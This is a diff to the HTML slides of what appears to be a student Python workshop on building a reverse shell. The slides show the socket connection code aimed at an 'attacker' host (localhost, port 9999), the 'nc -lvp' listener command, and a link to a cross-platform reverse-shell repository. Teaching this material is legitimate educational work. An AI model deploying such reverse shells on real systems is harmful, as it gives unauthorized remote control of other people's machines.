@@ -539,26 +539,91 @@ shuffle(x)   # No need to reference the class!
 		<section>
 			<h3> Setup </h3>
 			<li> <span style="font-weight: bold"> MacOS, Linux, and Bash For Windows Users: </span> Netcat should be preinstalled. Just have two terminal windows open </li>
-			<li><span style="font-weight: bold"> Repl.it users:</span> Unsupported. SSH into a lab (see next slide) </li> 			
+			<li><span style="font-weight: bold"> Repl.it users:</span> Unsupported. SSH into a lab (see next slide) </li> 	
+			<li> If NetCat doesn't work or you want to see how the server would look in Python, use my Python listener code instead of NetCat: Find it in the "Python" folder for this workshop or at <a> bit.ly/2TypaGs </a> </li>			
 		</section>
 		<section>
-			<h4>Windows and repl.it Users</h4>
-			<ul><li>NetCat is not  pre-installed on Windows. You have a few options: </li>
-				<ul>
-					<li> Use my Python listener code instead of NetCat: Find it in the "Python" folder for this workshop or at <a> bit.ly/2TypaGs </a></li> 
-					<li> Work from Remote Linux</li> <ul> 
+			<h4>Windows</h4>
+			<ul><li> My code uses UNIX dependent commands from the OS library. As such, I am not supporting Windows.</li>
+					<li> Option 1) RECOMMENDED: Work from a Remote UNIX machine</li> <ul> 
 						<li> CS Students: user@data.cs.purdue.edu </li>
-						<li>Other: user@maven.itap.purdue.edu </li>
-						</ul>  
-					
-					</ul>
-					<li> Google around - NetCat does exist on Windows! </li> 
+							<li> Other: user@maven.itap.purdue.edu </li>
+							</ul>  
+					<li> Option 2) If installed, you can use the Windows Linux Subsystem for Windows 10 or a VM </li>
+					<li> To learn about how a reverse shell can be adapted to Linux AND Windows, see <br><a> github.com/thelinuxchoice/shellpy</a> </li>
+
+
 			</ul>   	
-		
 		</section>
-
-
 	</section>
+	
+	<section  data-background="#E3EECD">
+		<section> 
+			<h3> Let's Hack! </h3>
+			<h5> This part will be live coding</h5>
+			<p> The next few slides will also step through the code for those reviewing post-workshop. These are not as much in-depth so contact me with questions! </p>
+		</section>
+		<section>
+			<h3> Imports and declarations </h3>
+			<pre style= "width: 100%; overflow-y: hidden; line-height: 1.1em;" ><code style="overflow-y: hidden" class="python hljs" data-trim contenteditable>
+#!/usr/bin/python
+import subprocess # Lets us start new processes/apps from within Python
+import os       # Gives us Operating System functions
+import socket   # Enables network programming w/ sockets in Python
+
+
+# IP of the attacker computer. We'll use localhost (127.0.0.1) 
+# because we'll be attacking our own computer.		
+host = "127.0.0.1"
+
+# Port to be used. Can be pretty much any 4 digit number. 
+port = 9999
+			</code></pre> 
+		</section>
+		<section>
+		<h3> Shell Confirm Function (Somewhat optional)</h3>
+		<img src="img/confirm.PNG" height="400px"/>
+		<li> Challenge: build a secure login feature for the attacker using randomized passwords.</li> 
+	</section>
+	<section> 
+		<h3> Shell Loop Function </h3>
+		<img src="img/shell.PNG" height="400px"/>
+		<li> Challenge: Use the OS library to implement other cool behaviors or scripts </li>
+	</section>
+	<section>
+		<h3> Starting our functions </h3>
+<pre style= "width: 100%; overflow-y: hidden; line-height: 1.1em;" ><code style="overflow-y: hidden" class="python hljs" data-trim contenteditable>
+# Intialize our socket - Internet Socket accessed via a stream.		
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+# Make a connection using our host name and port
+s.connect((host,port))
+# Start our Confirm function
+Confirm()
+</code></pre> 
+	</section>
+	<section  data-background="#E3EECD">
+		<h3> Putting it all together </h3>
+		<img src="img/final.PNG" height="550px"/>		
+	</section> 
+</section> 
+<section  data-background="#E3EECD">
+	<section>
+	<h3> Testing our script </h3>
+	<li> Attacker: Run <code> nc -lvp [PortNumber]</code> in terminal. </li> <ul>
+		<li> -l specifies to listen for a connection (listen mode) </li> 
+		<li> -v is for more verbose output, it's optional. </li>
+		<li> -p signals that we have a port we're going to listen on </li> 
+		<li> [PortNumber] is the port we set in the exploit code. I'm using 9999</li> 
+	</ul> 
+	<li> Now run our exploit script on the target machine (In our case another terminal window) with the command <code> python3 exploit.py</code>  </li> 
+	</section>
+	<section data-background-video="img/video.mp4"> 
+		<br> <br>
+		<h4> Left: Attacker   |||     Right: Target</h4> 
+	</section>
+</section>
+
+
 
 		
 
